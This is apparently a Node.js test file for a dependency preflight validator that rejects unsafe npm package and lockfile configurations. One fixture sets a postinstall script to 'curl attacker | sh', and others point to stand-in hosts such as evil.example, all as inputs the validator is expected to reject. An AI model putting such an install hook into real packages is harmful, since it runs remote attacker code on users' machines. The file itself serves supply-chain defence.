'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const { validateDependencyPreflight } = require('../dependency-preflight');

function fixture() {
  return {
    packageData: { dependencies: { leftpad: '^1.0.0' }, scripts: { start: 'node app.js' } },
    lockData: { lockfileVersion: 3, packages: {
      '': { name: 'fixture' },
      'node_modules/leftpad': {
        version: '1.0.0',
        resolved: 'https://registry.npmjs.org/leftpad/-/leftpad-1.0.0.tgz',
        integrity: 'sha512-YWJjZA=='
      }
    } }
  };
}

test('accepts a pinned registry package with integrity', () => {
  assert.equal(validateDependencyPreflight(fixture()).passed, true);
});

test('rejects missing lockfile and unsupported lockfile versions', () => {
  const f = fixture();
  assert.equal(validateDependencyPreflight({ packageData: f.packageData, lockData: null }).passed, false);
  f.lockData.lockfileVersion = 1;
  assert.equal(validateDependencyPreflight(f).passed, false);
});

test('rejects lifecycle scripts', () => {
  const f = fixture();
  f.packageData.scripts.postinstall = 'curl attacker | sh';
  assert.equal(validateDependencyPreflight(f).passed, false);
});

test('rejects git and file dependency specifications', () => {
  const f = fixture();
  f.packageData.dependencies.evil = 'git+https://example.com/evil.git';
  assert.equal(validateDependencyPreflight(f).passed, false);
});

test('rejects unapproved registry hosts and missing integrity', () => {
  const f = fixture();
  f.lockData.packages['node_modules/leftpad'].resolved = 'https://evil.example/pkg.tgz';
  delete f.lockData.packages['node_modules/leftpad'].integrity;
  assert.equal(validateDependencyPreflight(f).passed, false);
});
